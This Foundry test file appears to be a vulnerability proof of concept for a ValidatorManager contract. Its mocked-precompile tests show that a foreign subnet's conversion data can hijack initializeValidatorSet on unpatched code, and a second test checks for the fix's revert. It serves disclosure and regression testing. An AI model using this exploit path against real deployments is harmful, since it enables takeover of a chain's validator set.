// SPDX-License-Identifier: LicenseRef-Ecosystem
pragma solidity ^0.8.30;

import {Test} from "@forge-std/Test.sol";
import {ValidatorManager, ValidatorManagerSettings} from "@validator-manager/ValidatorManager.sol";
import {ValidatorMessages} from "@validator-manager/ValidatorMessages.sol";
import {WarpMessage, IWarpMessenger} from "@subnet-evm/IWarpMessenger.sol";
import {IACP99Manager, ConversionData, InitialValidator, PChainOwner} from "@validator-manager/interfaces/IACP99Manager.sol";
import {IValidatorManager} from "@validator-manager/interfaces/IValidatorManager.sol";
import {ICMInitializable} from "@utilities/ICMInitializable.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts@5.1.0/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts@5.1.0/proxy/transparent/ProxyAdmin.sol";

/**
 * PoC for Critical: initializeValidatorSet does not check subnetID
 * Run: forge test --match-contract ForeignSubnetPoC -vv
 * On vulnerable code: testForeignSubnetHijack succeeds (hijack)
 * On fixed code: testForeignSubnetHijack reverts InvalidSubnetID
 */
contract ForeignSubnetPoC is Test {
    bytes32 public constant VICTIM_SUBNET = bytes32(hex"1234567812345678123456781234567812345678123456781234567812345678");
    bytes32 public constant ATTACKER_SUBNET = bytes32(hex"8765432187654321876543218765432187654321876543218765432187654321");
    bytes32 public constant CHAIN_ID = bytes32(hex"abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd");
    address public constant WARP_PRECOMPILE_ADDRESS = 0x0200000000000000000000000000000000000005;

    bytes public constant NODE_ID_1 = bytes(hex"2341234123412341234123412341234123412341");
    bytes public constant BLS_KEY = bytes(hex"123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678");

    ValidatorManager public validatorManager;
    ProxyAdmin public proxyAdmin;

    PChainOwner public pChainOwner;

    function setUp() public {
        address[] memory addrs = new address[](1);
        addrs[0] = 0x1234567812345678123456781234567812345678;
        pChainOwner = PChainOwner({threshold: 1, addresses: addrs});

        ValidatorManager impl = new ValidatorManager(ICMInitializable.Disallowed);
        proxyAdmin = new ProxyAdmin(address(this));
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(impl),
            address(proxyAdmin),
            abi.encodeCall(
                ValidatorManager.initialize,
                ValidatorManagerSettings({
                    admin: address(this),
                    subnetID: VICTIM_SUBNET,
                    churnPeriodSeconds: 1 hours,
                    maximumChurnPercentage: 20
                })
            )
        );
        validatorManager = ValidatorManager(address(proxy));
    }

    function testForeignSubnetHijack_Vulnerable() public {
        // Simulate attacker creating their own subnet with manager = victim
        ConversionData memory attackerData = _defaultConversionData();
        attackerData.subnetID = ATTACKER_SUBNET; // foreign subnet

        // Mock Warp precompile to return victim chainID and a valid P-Chain signed conversion
        vm.mockCall(
            WARP_PRECOMPILE_ADDRESS,
            abi.encodeWithSelector(IWarpMessenger.getBlockchainID.selector),
            abi.encode(CHAIN_ID)
        );
        bytes32 conversionID = sha256(ValidatorMessages.packConversionData(attackerData));
        vm.mockCall(
            WARP_PRECOMPILE_ADDRESS,
            abi.encodeWithSelector(IWarpMessenger.getVerifiedWarpMessage.selector, uint32(0)),
            abi.encode(
                WarpMessage({
                    sourceChainID: validatorManager.P_CHAIN_BLOCKCHAIN_ID(),
                    originSenderAddress: address(0),
                    payload: ValidatorMessages.packSubnetToL1ConversionMessage(conversionID)
                }),
                true
            )
        );

        // On vulnerable code, this SUCCEEDS and hijacks L1
        // On fixed code, it reverts InvalidSubnetID
        // We test vulnerable behavior:
        validatorManager.initializeValidatorSet(attackerData, 0);

        // If we reach here, hijack succeeded
        assertTrue(validatorManager.isValidatorSetInitialized(), "should be initialized with attacker set");
        assertEq(validatorManager.l1TotalWeight(), 1_000_000_0000 + 1_000_000, "total weight from attacker data");
        // ValidationID is derived from attacker subnetID, not victim
        bytes32 validationID = sha256(abi.encodePacked(ATTACKER_SUBNET, uint32(0)));
        // Validator should be active
        // (getValidator returns struct, check status)
        // If attacker controls this, they control L1
        emit log("CRITICAL: Foreign subnet initialization succeeded - L1 hijacked!");
        emit log_named_bytes32("Attacker subnet used", ATTACKER_SUBNET);
        emit log_named_bytes32("Victim subnet expected", VICTIM_SUBNET);
    }

    function testForeignSubnetShouldRevert_AfterFix() public {
        ConversionData memory attackerData = _defaultConversionData();
        attackerData.subnetID = ATTACKER_SUBNET;

        vm.mockCall(
            WARP_PRECOMPILE_ADDRESS,
            abi.encodeWithSelector(IWarpMessenger.getBlockchainID.selector),
            abi.encode(CHAIN_ID)
        );
        bytes32 conversionID = sha256(ValidatorMessages.packConversionData(attackerData));
        vm.mockCall(
            WARP_PRECOMPILE_ADDRESS,
            abi.encodeWithSelector(IWarpMessenger.getVerifiedWarpMessage.selector, uint32(0)),
            abi.encode(
                WarpMessage({
                    sourceChainID: validatorManager.P_CHAIN_BLOCKCHAIN_ID(),
                    originSenderAddress: address(0),
                    payload: ValidatorMessages.packSubnetToL1ConversionMessage(conversionID)
                }),
                true
            )
        );

        // After fix, expect revert InvalidSubnetID
        vm.expectRevert(abi.encodeWithSelector(IValidatorManager.InvalidSubnetID.selector, ATTACKER_SUBNET));
        validatorManager.initializeValidatorSet(attackerData, 0);
    }

    function _defaultConversionData() internal view returns (ConversionData memory) {
        InitialValidator[] memory initialValidators = new InitialValidator[](2);
        initialValidators[0] = InitialValidator({
            nodeID: NODE_ID_1,
            weight: 1_000_000_0000,
            blsPublicKey: BLS_KEY
        });
        initialValidators[1] = InitialValidator({
            nodeID: bytes(hex"3412341234123412341234123412341234123412"),
            weight: 1_000_000,
            blsPublicKey: BLS_KEY
        });
        return ConversionData({
            subnetID: VICTIM_SUBNET,
            validatorManagerBlockchainID: CHAIN_ID,
            validatorManagerAddress: address(validatorManager),
            initialValidators: initialValidators
        });
    }
}
